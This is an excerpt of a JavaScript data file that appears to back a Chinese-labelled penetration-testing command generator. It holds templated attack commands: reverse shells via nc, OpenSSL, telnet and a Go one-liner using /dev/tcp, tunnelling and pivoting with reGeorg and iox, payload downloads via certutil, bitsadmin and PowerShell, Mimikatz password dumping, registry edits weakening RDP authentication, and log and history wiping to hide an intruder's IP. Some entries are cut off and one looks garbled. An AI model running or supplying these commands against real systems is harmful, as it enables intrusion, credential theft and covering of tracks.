...
const reverseShellCommands = withCommandType(
    ...
    [
        ...
        {
            "name": "nc mknod",
            "command": "rm -f /tmp/p;mknod /tmp/p p && nc {ip} {port} 0/tmp/",
            "meta": ["linux", "mac"]
        },
        {
            "name": "nc -e",
        ...
        {
            "name": "OpenSSL",
            "command":"mkfifo /tmp/s;\n{shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
            "meta":["linux", "mac"]
        },
        {
            "name": "telnet",
        ...
        {
              "name": "telnet输入输出命令分离",
              "command": "攻击机:\nnc -lvvp 65534\nnc -lvvp 65535\n\n靶机:\ntelnet {ip} 65534 | {shell} | telnet {ip} 65535",
              "meta": ["linux", "mac"]
        },
        {
            "name": "zsh",
        ...
        {
            "name": "Golang3",
            "command": "echo 'package main;import\"os/exec\";import\"log\";func main(){cmdline := \"bash -i >& /dev/tcp/192.168.0.1/65535 0>&1\";cmd := exec.Command(\"/bin/bash\", \"-c\", cmdline);}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
            "meta": ["linux", "mac", "windows"]
        },
        {
            "name": "Vlang",
...
const proxyCommands =  withCommandType(
    CommandType.Proxy,
    [
        {
            "name": "FRP服务端",
        ...
        {
            "name": "reGeorg",
            "command": "1.上传tunnel,访问显示GeorgXXX\n2.开启代理\npython reGeorgSocksProxy.py -p {port} -u http://{ip}/tunnel.php",
            "meta": ["windows"]
        },
        {
            "name": "iox 边界主机开启socks代理",
            "command": "1.开启socks服务:\niox proxy -l {port}",
            "meta": ["linux", "mac", "windows"]
        },
        {
            "name": "iox 边界主机开启socks代理将流量转发至VPS",
            "command": "1边界主机开启socks并将流量转发至VPS:\niox proxy -r {ip}:{port}\n2.VPS将接到的socks流量推到指定端口\niox proxy -l {port} -l 1080",
            "meta": ["linux", "mac", "windows"]
        },
        {
            "name": "iox 边界主机本地两端口间转发",
            "command": "iox fwd -l {port} -l 9999",
            "meta": ["linux", "mac", "windows"]
        },
        {
            "name": "iox 内网端口转到VPS指定端口",
            "command": "1.内网端口转到VPS指定端口:iox fwd -l 3389 -r {ip}:{port}\n2.VPS端口转发:\niox fwd -l {port} -l 9999\n直接连接VPS指定端口即可",
            "meta": ["linux", "mac", "windows"]
        },
        {
            "name": "iox 两个远程服务器之间端口转发",
...
const testCommands =  withCommandType(
    CommandType.Test,
    [
        {
            "name": "Windows certutil下载文件",
            "command": "certutil -f -split -urlcache http://{ip}:{port}/payload.exe",
            "meta": ["windows"]
        },

        {
            "name": "Windows bitsadmin下载文件",
            "command": "bitsadmin /transfer test http://{ip}:{port}/payload.exe C:\\payload.exe",
            "meta": ["windows"]
        },

        {
            "name": "Windows PowerShell下载文件",
            "command": "cmd /c powershell  (New-Object Net.WebClient).DownloadFile('http://{ip}:{port}/user.txt','C:\\payload.exe')",
            "meta": ["windows"]
        },
        {
            "name": "Linux curl下载文件",
            "command": "curl http://{ip}:{port}/payload [-o 文件名]",
            "meta": ["linux"]
        },
        {
            "name": "Linux wget下载文件",
            "command": "wget http://{ip}:{port}/payload [-O .\\payload]",
            "meta": ["linux"]
        },
        {
            "name": "Mimikatz提取密码",
            "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit >> password.txt\n\nmimikatz.exe \"privilege::debug\" \"lsadump::sam /system:system.hiv /sam:sam.hiv\" exit >> password.txt\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" \"exit\" >> password.txt",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell解除禁止运行",
            "command": "set-ExecutionPolicy RemoteSigned",
            "meta": ["windows"]
        },
        {
            "name": "cmd 命令通过注册表打开 3389 端口",
        ...
        {
            "name": "3389 任意版本连接",
            "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f",
            "meta": ["windows"]
        },
        {
            "name": "Win server允许单用户多个RDP会话",
            "command": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser\n\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f",
            "meta": ["windows"]
        },
    ]
);

const clearCommands =  withCommandType(
    CommandType.Clear,
    [
        {
            "name": "Linux本次不记录命令(完全不记录)",
        ...
        {
            "name": "Linux清除history记录文件",
            "command": "vim ~/.bash_history\n删除不想要的部分,dd删除一整行\nEsc,输入:wq,回车",
            "meta": ["linux"]
        },

        {
            "name": "Linux清除当前用户的history命令记录",
            "command": "history -c",
            "meta": ["linux"]
        },

        {
            "name": "Linux本次不记录命令(记录第一行)",
        ...
        {
            "name": "Linux删除/替换特定日志信息",
            "command": "删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip:\nsed  -i '/{ip}/'d  /var/log/messages\n\n全局替换登录IP地址:\nsed -i 's/{ip}/192.168.1.1/g' secure",
            "meta": ["linux"]
        },

        {
            "name": "Windows删除/替换特定日志信息",
